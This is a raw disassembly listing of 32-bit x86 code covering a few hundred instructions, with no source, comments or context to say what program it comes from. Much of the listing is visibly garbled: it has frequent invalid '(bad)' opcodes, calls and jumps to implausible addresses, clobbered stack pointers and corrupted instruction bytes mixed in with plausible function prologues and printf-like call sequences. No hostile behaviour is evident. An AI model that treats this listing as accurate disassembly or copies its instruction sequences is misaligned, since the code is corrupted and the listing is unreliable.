  401d41:	f3 e8 59 01 ee 00    	repz call 0x12e1ea0
  401d47:	83 72 04 83          	xorl   $0xffffff83,0x4(%edx)
  401d4b:	7e 08                	jle    0x401d55
  401d4d:	03 fe                	add    %esi,%edi
  401d4f:	5b                   	pop    %ebx
  401d50:	8b 4e 99             	mov    -0x67(%esi),%ecx
  401d53:	b8 01 00 00 00       	mov    $0x1,%eax
  401d58:	7a 04                	jp     0x401d5e
  401d5a:	c4 66 89             	les    -0x77(%esi),%esp
  401d5d:	cb                   	lret
  401d5e:	dc a1 f8 17 d4 00    	fsubl  0xd417f8(%ecx)
  401d64:	8d 55 5c             	lea    0x5c(%ebp),%edx
  401d67:	52                   	push   %edx
  401d68:	50                   	push   %eax
  401d69:	89 67 e0             	mov    %esp,-0x20(%edi)
  401d6c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  401d6f:	e8 4c 43 00 03       	call   0x34060c0
  401d74:	eb 23                	jmp    0x401d99
  401d76:	8b 3d b8 46 10 00    	mov    0x1046b8,%edi
  401d7c:	8b 15 cc 02 41 00    	mov    0x4102cc,%edx
  401d82:	47                   	inc    %edi
  401d83:	42                   	inc    %edx
  401d84:	89 e1                	mov    %esp,%ecx
  401d86:	b8 61 41 00 89       	mov    $0x89004161,%eax
  401d8b:	15 2b 5c 41 00       	adc    $0x415c2b,%eax
  401d90:	56                   	push   %esi
  401d91:	46                   	inc    %esi
  401d92:	ca 1a 00             	lret   $0x1a
  401d95:	00 83 c4 04 54 da    	add    %al,-0x25abfb3c(%ebx)
  401d9b:	21 8b 55 f8 8b 4d    	and    %ecx,0x4d8bf855(%ebx)
  401da1:	fc                   	cld
  401da2:	40                   	inc    %eax
  401da3:	83 c2 14             	add    $0x14,%edx
  401da6:	3b c1                	cmp    %ecx,%eax
  401da8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401dab:	89 8b f8 0f d2 a8    	mov    %ecx,-0x572df008(%ebx)
  401db1:	fe                   	(bad)
  401db2:	ff 14 8b             	call   *(%ebx,%ecx,4)
  401db5:	0d 37 0b 41 b2       	or     $0xb2410b37,%eax
  401dba:	8b 26                	mov    (%esi),%esp
  401dbc:	f0 3b c8             	lock cmp %eax,%ecx
  401dbf:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  401dc4:	7f 1b                	jg     0x401de1
  401dc6:	7c eb                	jl     0x401db3
  401dc8:	8b 15 a0 0b 41 00    	mov    0x410ba0,%edx
  401dce:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  401dd1:	3b b6 bc 0c 3b 05    	cmp    0x53b0cbc(%esi),%esi
  401dd7:	10 d0                	adc    %dl,%al
  401dd9:	40                   	inc    %eax
  401dda:	00 0f                	add    %cl,(%edi)
  401ddc:	8c 12                	mov    %ss,(%edx)
  401dde:	fe                   	(bad)
  401ddf:	ff                   	(bad)
  401de0:	ff 8b 0d 3a d0 40    	decl   0x40d03a0d(%ebx)
  401de6:	54                   	push   %esp
  401de7:	85 c9                	test   %ecx,%ecx
  401de9:	b1 1a                	mov    $0x1a,%cl
  401deb:	50                   	push   %eax
  401dec:	61                   	popa
  401ded:	c8 c0 0a 51          	enter  $0xac0,$0x51
  401df1:	26 c0 40 68 80       	rolb   $0x80,%es:0x68(%eax)
  401df6:	d2 40 00             	rolb   %cl,0x0(%eax)
  401df9:	50                   	push   %eax
  401dfa:	6c                   	insb   (%dx),%es:(%edi)
  401dfb:	15 80 c1 40 00       	adc    $0x40c180,%eax
  401e00:	83 ae 6a eb 0e 68 96 	subl   $0xffffff96,0x680eeb6a(%esi)
  401e07:	d2 40 00             	rolb   %cl,0x0(%eax)
  401e0a:	7f 15                	jg     0x401e21
  401e0c:	52                   	push   %edx
  401e0d:	04 40                	add    $0x40,%al
  401e0f:	4f                   	dec    %edi
  401e10:	09 f8                	or     %edi,%eax
  401e12:	04 a1                	add    $0xa1,%al
  401e14:	88 02                	mov    %al,(%edx)
  401e16:	41                   	inc    %ecx
  401e17:	00 85 c0 74 0c e8    	add    %al,-0x17f38b40(%ebp)
  401e1d:	df 13                	fists  (%ebx)
  401e1f:	00 00                	add    %al,(%eax)
  401e21:	5f                   	pop    %edi
  401e22:	38 5b 8b             	cmp    %bl,-0x75(%ebx)
  401e25:	e5 5d                	in     $0x5d,%eax
  401e27:	c3                   	ret
  401e28:	6a 00                	push   $0x0
  401e2a:	e8 31 02 00 00       	call   0x402060
  401e2f:	83 c4 7f             	add    $0x7f,%esp
  401e32:	5f                   	pop    %edi
  401e33:	5e                   	pop    %esi
  401e34:	92                   	xchg   %eax,%edx
  401e35:	8b 4f 5d             	mov    0x5d(%edi),%ecx
  401e38:	c3                   	ret
  401e39:	90                   	nop
  401e3a:	90                   	nop
  401e3b:	90                   	nop
  401e3c:	90                   	nop
  401e3d:	90                   	nop
  401e3e:	90                   	nop
  401e3f:	90                   	nop
  401e40:	55                   	push   %ebp
  401e41:	8b ec                	mov    %esp,%ebp
  401e43:	83 ec 41             	sub    $0x41,%esp
  401e46:	56                   	push   %esi
  401e47:	8b 75 0c             	mov    0xc(%ebp),%esi
  401e4a:	5a                   	pop    %edx
  401e4b:	8d 0a                	lea    (%edx),%ecx
  401e4d:	78 6a                	js     0x401eb9
  401e4f:	78 50                	js     0x401ea1
  401e51:	56                   	push   %esi
  401e52:	e8 8e 68 00 e1       	call   0xe14086e5
  401e57:	8b 87 c1 8b 15 c8    	mov    -0x37ea743f(%edi),%eax
  401e5d:	c0 74 24 50 07       	shlb   $0x7,0x50(%esp)
  401e62:	83 c2 40             	add    $0x40,%edx
  401e65:	68 ac d4 40 64       	push   $0x6440d4ac
  401e6a:	52                   	push   %edx
  401e6b:	ff 15 80 c1 7e 00    	call   *0x7ec180
  401e71:	a1 ac ad a7 00       	mov    0xa7adac,%eax
  401e76:	83 c4 14             	add    $0x14,%esp
  401e79:	85 c0                	test   %eax,%eax
  401e7b:	74 0f                	je     0x401e8c
  401e7d:	50                   	push   %eax
  401e7e:	68 54 d2 40 00       	push   $0x40d254
  401e83:	ea 15 64 c1 40 00 83 	ljmp   $0x8300,$0x40c16415
  401e8a:	c4 26                	les    (%esi),%esp
  401e8c:	56                   	push   %esi
  401e8d:	ff 15 70 c1 40 7f    	call   *0x7f40c170
  401e93:	5e                   	pop    %esi
  401e94:	90                   	nop
  401e95:	90                   	nop
  401e96:	90                   	nop
  401e97:	90                   	nop
  401e98:	90                   	nop
  401e99:	20 90 32 90 41 90    	and    %dl,-0x6fbe6fce(%eax)
  401e9f:	90                   	nop
  401ea0:	55                   	push   %ebp
  401ea1:	8b ec                	mov    %esp,%ebp
  401ea3:	83 ec 14             	sub    $0x14,%esp
  401ea6:	53                   	push   %ebx
  401ea7:	56                   	push   %esi
  401ea8:	8b 86 4d 57 8b f9    	mov    -0x674a8b3(%esi),%eax
  401eae:	73 89                	jae    0x401e39
  401eb0:	c7                   	(bad)
  401eb1:	08 f9                	or     %bh,%cl
  401eb3:	49                   	dec    %ecx
  401eb4:	4b                   	dec    %ebx
  401eb5:	00 00                	add    %al,(%eax)
  401eb7:	a3 a0 0b 41 00       	mov    %eax,0x410ba0
  401ebc:	89 15 a4 0b 41 b1    	mov    %edx,0xb1410ba4
  401ec2:	8b d8                	mov    %eax,%ebx
  401ec4:	8b db                	mov    %ebx,%ebx
  401ec6:	14 85                	adc    $0x85,%al
  401ec8:	c0 8b 40 f1 40 8b 4e 	rorb   $0x4e,-0x74bf0ec0(%ebx)
  401ecf:	04 6a                	add    $0x6a,%al
  401ed1:	00 6a 00             	add    %ch,0x0(%edx)
  401ed4:	91                   	xchg   %eax,%ecx
  401ed5:	e8 3d 6d d6 b5       	call   0xb6168c17
  401eda:	89 9e 38 08 00 00    	mov    %ebx,0x838(%esi)
  401ee0:	89 be 3c 54 00 00    	mov    %edi,0x543c(%esi)
  401ee6:	c7                   	(bad)
  401ee7:	bc 18 00 00 7f       	mov    $0x7f000018,%esp
  401eec:	d9 32                	fnstenv (%edx)
  401eee:	df ec                	fucomip %st(4),%st
  401ef0:	17                   	pop    %ss
  401ef1:	30 00                	xor    %al,(%eax)
  401ef3:	89 56 14             	mov    %edx,0x14(%esi)
  401ef6:	a1 60 8d ba 00       	mov    0xba8d60,%eax
  401efb:	d0 ad a9 3b a1 70    	shrb   $1,0x70a13ba9(%ebp)
  401f01:	02 2f                	add    (%edi),%ch
  401f03:	00 8b ca 03 c8 89    	add    %cl,-0x7637fc36(%ebx)
  401f09:	88 14 eb             	mov    %dl,(%ebx,%ebp,8)
  401f0c:	c2 8b 8e             	ret    $0x8e8b
  401f0f:	33 d4                	xor    %esp,%edx
  401f11:	00 a7 a1 28 13 8a    	add    %ah,-0x75ecd75f(%edi)
  401f17:	00 8b b7 2c d0 40    	add    %cl,0x40d02cb7(%ebx)
  401f1d:	00 03                	add    %al,(%ebx)
  401f1f:	c8 8b 86 3c          	enter  $0x868b,$0x3c
  401f23:	08 00                	or     %al,(%eax)
  401f25:	00 13                	add    %dl,(%ebx)
  401f27:	c2 09 f8             	ret    $0xf809
  401f2a:	d2 8f e5 00 00 00    	rorb   %cl,0xe5(%edi)
  401f30:	7c 08                	jl     0x401f3a
  401f32:	3b 5c 0f 87          	cmp    -0x79(%edi,%ecx,1),%ebx
  401f36:	db 00                	fildl  (%eax)
  401f38:	b3 00                	mov    $0x0,%bl
  401f3a:	8b 56 18             	mov    0x18(%esi),%edx
  401f3d:	8b 1d 30 d0 40 00    	mov    0x40d030,%ebx
  401f43:	8b 46 04             	mov    0x4(%esi),%eax
  401f46:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401f49:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401f4a:	d3 51 52             	rcll   %cl,0x52(%ecx)
  401f4d:	50                   	push   %eax
  401f4e:	e8 6d 6b 00 00       	call   0x408ac0
  401f53:	85 c0                	test   %eax,%eax
  401f55:	61                   	popa
  401f56:	33 83 22 64 74 2e    	xor    0x2e746422(%ebx),%eax
  401f5c:	92                   	xchg   %eax,%edx
  401f5d:	03 fd                	add    %ebp,%edi
  401f5f:	0a 00                	or     (%eax),%al
  401f61:	74 27                	je     0x401f8a
  401f63:	3d d9 19 0a 00       	cmp    $0xa19d9,%eax
  401f68:	74 20                	je     0x401f8a
  401f6a:	3d 57 14 d2 00       	cmp    $0xd21457,%eax
  401f6f:	74 f1                	je     0x401f62
  401f71:	3d 24 fd 0e e8       	cmp    $0xe80efd24,%eax
  401f76:	74 12                	je     0x401f8a
  401f78:	3d a1 fc 0a 00       	cmp    $0xafca1,%eax
  401f7d:	74 0b                	je     0x401f8a
  401f7f:	3d b3 23 0b e2       	cmp    $0xe20b23b3,%eax
  401f84:	0f 85 a6 b8 00 7a    	jne    0x7a40d830
  401f8a:	8b 45 08             	mov    0x8(%ebp),%eax
  401f8d:	8b 1d 1b 02 1b 67    	mov    0x671b021b,%ebx
  401f93:	75 3d                	jne    0x401fd2
  401f95:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401f96:	02 41 00             	add    0x0(%ecx),%al
  401f99:	03 d8                	add    %eax,%ebx
  401f9b:	83 d7 00             	adc    $0x0,%edi
  401f9e:	90                   	nop
  401f9f:	91                   	xchg   %eax,%ecx
  401fa0:	a0 02 d0 00 89       	mov    0x8900d002,%al
  401fa5:	f5                   	cmc
  401fa6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401fa7:	9e                   	sahf
  401fa8:	41                   	inc    %ecx
  401fa9:	00 8b 56 f1 8b 4f    	add    %cl,0x4f8bf156(%ebx)
  401faf:	14 69                	adc    $0x69,%al
  401fb1:	d0 2b                	shrb   $1,(%ebx)
  401fb3:	c8 89 66 9c          	enter  $0x6689,$0x9c
  401fb7:	89 4e 14             	mov    %ecx,0x14(%esi)
  401fba:	0f 85 ec fe ff ff    	jne    0x401eac
  401fc0:	c7                   	(bad)
  401fc1:	69 08 97 00 00 00    	imul   $0x97,(%eax),%ecx
  401fc7:	7d 34                	jge    0x401ffd
  401fc9:	4a                   	dec    %edx
  401fca:	00 00                	add    %al,(%eax)
  401fcc:	a3 a0 0b 41 7d       	mov    %eax,0x7d410ba0
  401fd1:	89 4a a4             	mov    %ecx,-0x5c(%edx)
  401fd4:	0b 41 28             	or     0x28(%ecx),%eax
  401fd7:	8b 00                	mov    (%eax),%eax
  401fd9:	04 89                	add    $0x89,%al
  401fdb:	85 40 9c             	test   %eax,-0x64(%eax)
  401fde:	00 00                	add    %al,(%eax)
  401fe0:	8b 0d 20 0b 48 cd    	mov    0xcd480b20,%ecx
  401fe6:	b8 01 00 00 00       	mov    $0x1,%eax
  401feb:	89 45 ae             	mov    %eax,-0x52(%ebp)
  401fee:	66 89 45 f4          	mov    %ax,-0xc(%ebp)
  401ff2:	89 8e 44 08 90 00    	mov    %ecx,0x900844(%esi)
  401ff8:	8b 0d f8 17 41 00    	mov    0x4117f8,%ecx
  401ffe:	8d 45 0b             	lea    0xb(%ebp),%eax
  402001:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402004:	2d 51 89 75 fc       	sub    $0xfc758951,%eax
  402009:	e8 b2 40 00 00       	call   0x4060c0
  40200e:	5f                   	pop    %edi
  40200f:	5e                   	pop    %esi
  402010:	5b                   	pop    %ebx
  402011:	8b e5                	mov    %ebp,%esp
  402013:	71 c3                	jno    0x401fd8
  402015:	68 58 d4 40 dd       	push   $0xdd40d458
  40201a:	ff 15 64 c1 40 00    	call   *0x40c164
  402020:	56                   	push   %esi
  402021:	e8 51 1a e8 00       	call   0x1283a77
  402026:	df d9                	(bad)
  402028:	08 5f d2             	or     %bl,-0x2e(%edi)
  40202b:	5b                   	pop    %ebx
  40202c:	8b 9d 5d 47 8b 1d    	mov    0x1d8b475d(%ebp),%ebx
  402032:	bc 02 41 00 68       	mov    $0x68004102,%esp
  402037:	bc d4 40 b0 43       	mov    $0x43b040d4,%esp
  40203c:	89 1d bc 02 3f 00    	mov    %ebx,0x3f02bc
  402042:	ff 15 64 c1 40 00    	call   *0x40c164
  402048:	e8 8c 3e 1a 00       	call   0x5a5ed9
  40204d:	00 83 1c f0 5f f1    	add    %al,-0xea00fe4(%ebx)
  402053:	5b                   	pop    %ebx
  402054:	8b e5                	mov    %ebp,%esp
  402056:	5d                   	pop    %ebp
  402057:	c3                   	ret
  402058:	90                   	nop
  402059:	90                   	nop
  40205a:	90                   	nop
  40205b:	ed                   	in     (%dx),%eax
  40205c:	90                   	nop
  40205d:	90                   	nop
  40205e:	90                   	nop
  40205f:	90                   	nop
  402060:	55                   	push   %ebp
  402061:	8b ec                	mov    %esp,%ebp
  402063:	81 ec bc 00 00 00    	sub    $0xbc,%esp
  402069:	8b 45 08             	mov    0x8(%ebp),%eax
  40206c:	3d c0 02 12 e8       	cmp    $0xe81202c0,%eax
  402071:	8b 49 00             	mov    0x0(%ecx),%ecx
  402074:	00 a3 a0 0b 41 2b    	add    %ah,0x2b410ba0(%ebx)
  40207a:	89 f7                	mov    %esi,%edi
  40207c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40207d:	0b 41 00             	or     0x0(%ecx),%eax
  402080:	eb 0b                	jmp    0x40208d
  402082:	8b 99 a4 0b 41 00    	mov    0x410ba4(%ecx),%ebx
  402088:	f7 fe                	idiv   %esi
  40208a:	0b 41 00             	or     0x0(%ecx),%eax
  40208d:	21 8b 1d c0 0b 6d    	and    %ecx,0x6d0bc01d(%ebx)
  402093:	00 56 bb             	add    %dl,-0x45(%esi)
  402096:	8b c8                	mov    %eax,%ecx
  402098:	c4 0b                	les    (%ebx),%ecx
  40209a:	41                   	inc    %ecx
  40209b:	13 2b                	adc    (%ebx),%ebp
  40209d:	5e                   	pop    %esi
  40209e:	1b d7                	sbb    %edi,%edx
  4020a0:	89 82 d8 87 d8 55    	mov    %eax,0x55d887d8(%edx)
  4020a6:	8b 35 a3 c1 40 00    	mov    0x40c1a3,%esi
  4020ac:	df 6d d8             	fildll -0x28(%ebp)
  4020af:	68 b4 df 40 00       	push   $0x40dfb4
  4020b4:	dc 0d 38 bf 40 00    	fmull  0x40bf38
  4020ba:	dd 5d d0             	fstpl  -0x30(%ebp)
  4020bd:	0c d6                	or     $0xd6,%al
  4020bf:	68 e0 12 41 00       	push   $0x4112e0
  4020c4:	68 45 ce 40 82       	push   $0x8240ce45
  4020c9:	ff d6                	call   *%esi
  4020cb:	a1 00 18 cc 00       	mov    0xcc1800,%eax
  4020d0:	50                   	push   %eax
  4020d1:	3c 7c                	cmp    $0x7c,%al
  4020d3:	df 40 00             	filds  0x0(%eax)
  4020d6:	ff d6                	call   *%esi
  4020d8:	33 c9                	xor    %ecx,%ecx
  4020da:	66 8b 5c f4 17       	mov    0x17(%esp,%esi,8),%bx
  4020df:	41                   	inc    %ecx
  4020e0:	00 51 59             	add    %dl,0x59(%ecx)
  4020e3:	5c                   	pop    %esp
  4020e4:	a0 40 00 ff 5c       	mov    0x5cff0040,%al
  4020e9:	68 80 d4 40 00       	push   $0x40d480
  4020ee:	1e                   	push   %ds
  4020ef:	d6                   	salc
  4020f0:	8b 15 e4 17 41 00    	mov    0x4117e4,%edx
  4020f6:	52                   	push   %edx
  4020f7:	68 40 df e5 00       	push   $0xe5df40
  4020fc:	ff d6                	call   *%esi
  4020fe:	8a 8c 02 41 00 50 68 	mov    0x68500041(%edx,%eax,1),%cl
  402105:	1c 50                	sbb    $0x50,%al
  402107:	d3 00                	roll   %cl,(%eax)
  402109:	ff d6                	call   *%esi
  40210b:	21 44 d4 40          	and    %eax,0x40(%esp,%edx,8)
  40210f:	00 ff                	add    %bh,%bh
  402111:	d6                   	salc
  402112:	8b 43 d5             	mov    -0x2b(%ebx),%eax
  402115:	d0 be 00 51 68 00    	sarb   $1,0x685100(%esi)
  40211b:	df 40 00             	filds  0x0(%eax)
  40211e:	66 d6                	data16 salc
  402120:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  402123:	4a                   	dec    %edx
  402124:	2a fc                	sub    %ah,%bh
  402126:	52                   	push   %edx
  402127:	50                   	push   %eax
  402128:	68 d8 71 08 00       	push   $0x871d8
  40212d:	ff c7                	inc    %edi
  40212f:	8b 0d ac 02 41 00    	mov    0x4102ac,%ecx
  402135:	11 fb                	adc    %edi,%ebx
  402137:	48                   	dec    %eax
  402138:	51                   	push   %ecx
  402139:	d5 bc                	aad    $0xbc
  40213b:	de 0b                	fimuls (%ebx)
  40213d:	00 ff                	add    %bh,%bh
  40213f:	f6 8b c6 b8 02 b9 00 	testb  $0x0,-0x46fd473a(%ebx)
  402146:	69 68 a0 ff 40 00 ff 	imul   $0xff0040ff,-0x60(%eax),%ebp
  40214d:	3c a1                	cmp    $0xa1,%al
  40214f:	b8 40 35 00 83       	mov    $0x83003540,%eax
  402154:	c4 10                	les    (%eax),%edx
  402156:	85 c0                	test   %eax,%eax
  402158:	74 24                	je     0x40217e
  40215a:	a1 cc 02 41 00       	mov    0x4102cc,%eax
  40215f:	8b 0d c0 02 41 00    	mov    0x4102c0,%ecx
  402165:	8b 2e                	mov    (%esi),%ebp
  402167:	c8 7d 41 a4          	enter  $0x417d,$0xa4
  40216b:	50                   	push   %eax
  40216c:	a1 c4 02 41 ac       	mov    0xac4102c4,%eax
  402171:	51                   	push   %ecx
  402172:	52                   	push   %edx
  402173:	50                   	push   %eax
  402174:	68 23 de 40 00       	push   $0x40de23
  402179:	ff d6                	call   *%esi
  40217b:	83 e9 14             	sub    $0x14,%ecx
  40217e:	8b 0d 54 02 41 00    	mov    0x410254,%ecx
  402184:	51                   	push   %ecx
  402185:	68 48 de 0b 00       	push   $0xbde48
  40218a:	ff d6                	call   *%esi
  40218c:	a1 2b 70 41 00       	mov    0x41702b,%eax
  402191:	83 c4 5b             	add    $0x5b,%esp
  402194:	85 c0                	test   %eax,%eax
  402196:	df 0b                	fisttps (%ebx)
  402198:	ba 68 2c de 40       	mov    $0x40de2c68,%edx
  40219d:	00 dc                	add    %bl,%ah
  40219f:	62 83 c4 08 a1 68    	bound  %eax,0x68a108c4(%ebx)
  4021a5:	02 41 00             	add    0x0(%ecx),%al
  4021a8:	c4                   	(bad)
  4021a9:	c0 74 11 8b 15       	shlb   $0x15,-0x75(%ecx,%edx,1)
  4021ae:	b0 02                	mov    $0x2,%al
  4021b0:	41                   	inc    %ecx
  4021b1:	00 52 68             	add    %dl,0x68(%edx)
  4021b4:	53                   	push   %ebx
  4021b5:	de 40 00             	fiadds 0x0(%eax)
  4021b8:	ff d6                	call   *%esi
  4021ba:	83 1a ba             	sbbl   $0xffffffba,(%edx)
  4021bd:	a1 94 02 c6 00       	mov    0xc60294,%eax
  4021c2:	8b 0d 90 02 cb 38    	mov    0x38cb0290,%ecx
  4021c8:	50                   	push   %eax
  4021c9:	51                   	push   %ecx
  4021ca:	68 e8 da ba 00       	push   $0xbadae8
  4021cf:	ff 5e a1             	lcall  *-0x5f(%esi)
  4021d2:	f3 02 41 00          	repz add 0x0(%ecx),%al
  4021d6:	83 c4 0c             	add    $0xc,%esp
  4021d9:	83 f8 01             	cmp    $0x1,%eax
  4021dc:	75 17                	jne    0x4021f5
  4021de:	e2 15                	loop   0x4021f5
  4021e0:	9d                   	popf
  4021e1:	02 41 00             	add    0x0(%ecx),%al
  4021e4:	a1 08 40 fa 00       	mov    0xfa4008,%eax
  4021e9:	52                   	push   %edx
  4021ea:	50                   	push   %eax
  4021eb:	ff c8                	dec    %eax
  4021ed:	dd 42 00             	fldl   0x0(%edx)
  4021f0:	ff d6                	call   *%esi
  4021f2:	83 cc 0c             	or     $0xc,%esp
  4021f5:	83 3d 60 02 41 00 02 	cmpl   $0x2,0x410260
  4021fc:	75 18                	jne    0x402216
  4021fe:	8b 0d a4 02 41 00    	mov    0x4102a4,%ecx
  402204:	b4 15                	mov    $0x15,%ah
  402206:	a0 02 fd e0 51       	mov    0x51e0fd02,%al
  40220b:	52                   	push   %edx
  40220c:	a0 a8 dd 92 00       	mov    0x92dda8,%al
  402211:	ff d6                	call   *%esi
  402213:	83 c4 0c             	add    $0xc,%esp
  402216:	94                   	xchg   %eax,%esp
  402217:	51                   	push   %ecx
  402218:	5e                   	pop    %esi
  402219:	41                   	inc    %ecx
  40221a:	00 8b 5e 42 02 41    	add    %cl,0x4102425e(%ebx)
  402220:	00 50 07             	add    %dl,0x7(%eax)
  402223:	7b 80                	jnp    0x4021a5
  402225:	dd 40 00             	fldl   0x0(%eax)
  402228:	ff d6                	call   *%esi
  40222a:	dd 4d d0             	fisttpll -0x30(%ebp)
  40222d:	dc 1d 30 39 40 00    	fcompl 0x403930
  402233:	83 c4 0c             	add    $0xc,%esp
  402236:	df e0                	fnstsw %ax
  402238:	f6 c4 9d             	test   $0x9d,%ah
  40223b:	0f 8b 6a 00 00 13    	jnp    0x134022ab
  402241:	a1 ac 02 ef 00       	mov    0xef02ac,%eax
  402246:	85 c0                	test   %eax,%eax
  402248:	0f 84 7e 0e 00 3f    	je     0x3f4030cc
  40224e:	dd 05 28 c2 40 00    	fldl   0x40c228
  402254:	dc 75 d0             	fdivl  -0x30(%ebp)
  402257:	44                   	inc    %esp
  402258:	fa                   	cli
  402259:	08 56 ff             	or     %dl,-0x1(%esi)
  40225c:	31 db                	xor    %ebx,%ebx
  40225e:	05 ac 02 41 00       	add    $0x4102ac,%eax
  402263:	dc 4d 80             	fmull  -0x80(%ebp)
  402266:	dd fa                	(bad)
  402268:	24 68                	and    $0x68,%al
  40226a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40226b:	dd 68 00             	(bad) 0x0(%eax)
  40226e:	e4 d6                	in     $0xd6,%al
  402270:	db 2d 18 d0 40 7d    	fldt   0x7d40d018
  402276:	83 c4 42             	add    $0x42,%esp
  402279:	23 e1                	and    %ecx,%esp
  40227b:	d0 dc                	rcr    $1,%ah
  40227d:	0d 20 44 40 00       	or     $0x404420,%eax
  402282:	da 35 ac 89 7c 00    	fidivl 0x7c89ac
  402288:	dd 1c 24             	fstpl  (%esp)
  40228b:	68 24 dd 40 00       	push   $0x40dd24
  402290:	ff d6                	call   *%esi
  402292:	dd 45 d0             	fldl   -0x30(%ebp)
  402295:	dc 0d 20 c2 40 00    	fmull  0x40c220
  40229b:	83 c4 04             	add    $0x4,%esp
  40229e:	da 35 ac 02 41 da    	fidivl 0xda4102ac
  4022a4:	dd 32                	fnsave (%edx)
  4022a6:	24 68                	and    $0x68,%al
  4022a8:	d8 20                	fsubs  (%eax)
  4022aa:	40                   	inc    %eax
  4022ab:	12 7d d6             	adc    -0x2a(%ebp),%bh
  4022ae:	df 2d 2d 02 41 00    	fildll 0x41022d
  4022b4:	83 c4 04             	add    $0x4,%esp
  4022b7:	27                   	daa
  4022b8:	4d                   	dec    %ebp
  4022b9:	80 f2 0d             	xor    $0xd,%dl
  4022bc:	18 c2                	sbb    %al,%dl
  4022be:	40                   	inc    %eax
  4022bf:	00 dd                	add    %bl,%ch
  4022c1:	1c 24                	sbb    $0x24,%al
  4022c3:	ba a4 dc 40 00       	mov    $0x40dca4,%edx
  4022c8:	ff d3                	call   *%ebx
  4022ca:	a1 35 02 41 00       	mov    0x410235,%eax
  4022cf:	83 c4 0c             	add    $0xc,%esp
  4022d2:	85 c0                	test   %eax,%eax
  4022d4:	7e 59                	jle    0x40232f
  4022d6:	16                   	push   %ss
  4022d7:	4a                   	dec    %edx
  4022d8:	a0 02 41 d1 7f       	mov    0x7fd14102,%al
  4022dd:	ec                   	in     (%dx),%al
  4022de:	b2 b5                	mov    $0xb5,%dl
  4022e0:	4d                   	dec    %ebp
  4022e1:	80 dc 0d             	sbb    $0xd,%ah
  4022e4:	18 c2                	sbb    %al,%dl
  4022e6:	40                   	inc    %eax
  4022e7:	a0 dd ab 24 68       	mov    0x6824abdd,%al
  4022ec:	7c dc                	jl     0x4022ca
  4022ee:	40                   	inc    %eax
  4022ef:	00 9a d6 cc 15 a0    	add    %bl,-0x5fea332a(%edx)
  4022f5:	02 72 00             	add    0x0(%edx),%dh
  4022f8:	f4                   	hlt
  4022f9:	1d 90 0a 7a 00       	sbb    $0x7a0a90,%eax
  4022fe:	0a a4 02 85 00 d8 3d 	or     0x3dd80085(%edx,%eax,1),%ah
  402305:	94                   	xchg   %eax,%esp
  402306:	02 41 00             	add    0x0(%ecx),%al
  402309:	03 d3                	add    %ebx,%edx
  40230b:	79 c7                	jns    0x4022d4
  40230d:	89 55 d8             	mov    %edx,-0x28(%ebp)
  402310:	cd 45                	int    $0x45
  402312:	dc 83 c4 04 df 6d    	faddl  0x6ddf04c4(%ebx)
  402318:	d8 dc                	fcomp  %st(4)
  40231a:	4d                   	dec    %ebp
  40231b:	80 dc 0d             	sbb    $0xd,%ah
  40231e:	18 c2                	sbb    %al,%dl
  402320:	40                   	inc    %eax
  402321:	28 dd                	sub    %bl,%ch
  402323:	1c 24                	sbb    $0x24,%al
  402325:	68 50 48 40 00       	push   $0x404850
  40232a:	ff d6                	call   *%esi
  40232c:	18 d3                	sbb    %dl,%bl
  40232e:	0c a1                	or     $0xa1,%al
  402330:	ac                   	lods   %ds:(%esi),%al
  402331:	02 41 00             	add    0x0(%ecx),%al
  402334:	85 c0                	test   %eax,%eax
  402336:	0f 8e 89 0d 34 39    	jle    0x397430c5
  40233c:	33 c9                	xor    %ecx,%ecx
  40233e:	83 cf ff             	or     $0xffffffff,%edi
  402341:	ba be ff ff e6       	mov    $0xe6ffffbe,%edx
  402346:	54                   	push   %esp
  402347:	c1 89 4d c0 89 4d 10 	rorl   $0x10,0x4d89c04d(%ecx)
  40234e:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  402351:	89 2d cc 89 4d e0    	mov    %ebp,0xe04d89cc
  402357:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40235a:	89 5a e8             	mov    %ebx,-0x18(%edx)
  40235d:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  402360:	89 7d b0             	mov    %edi,-0x50(%ebp)
  402363:	58                   	pop    %eax
  402364:	55                   	push   %ebp
  402365:	b4 89                	mov    $0x89,%ah
  402367:	7d a0                	jge    0x402309
  402369:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  40236c:	89 bd 60 ff ff ff    	mov    %edi,-0xa0(%ebp)
  402372:	89 95 47 ae ff ff    	mov    %edx,-0x51b9(%ebp)
  402378:	99                   	cltd
  402379:	7d 88                	jge    0x402303
  40237b:	75 55                	jne    0x4023d2
  40237d:	d4 c3                	aam    $0xc3
  40237f:	8d 70 e0             	lea    -0x20(%eax),%esi
  402382:	ff                   	(bad)
  402383:	ff 89 0b 74 ff ff    	decl   -0x8bf5(%ecx)
  402389:	ff 89 4d b8 89 4d    	decl   0x4d89b84d(%ecx)
  40238f:	bc 89 8d 68 ff       	mov    $0xff688d89,%esp
  402394:	ff                   	(bad)
  402395:	ff 89 8d 90 7b 93    	decl   -0x6c846f73(%ecx)
  40239b:	ff 89 4d c1 89 4d    	decl   0x4d89c14d(%ecx)
  4023a1:	84 89 8d 98 ff ff    	test   %cl,-0x6773(%ecx)
  4023a7:	f1                   	int1
  4023a8:	89 8d 7c 23 ff ff    	mov    %ecx,-0xdc84(%ebp)
  4023ae:	89 be a8 89 15 ac    	mov    %edi,-0x53ea7658(%esi)
  4023b4:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4023b7:	37                   	aaa
  4023b8:	f5                   	cmc
  4023b9:	8c 89 4d 90 89 4d    	mov    %cs,0x4d89904d(%ecx)
  4023bf:	94                   	xchg   %eax,%esp
  4023c0:	0f 8e 8b 01 00 00    	jle    0x402551
  4023c6:	8b 0d c8 0b 41 00    	mov    0x410bc8,%ecx
  4023cc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4023cf:	83 c1 10             	add    $0x10,%ecx
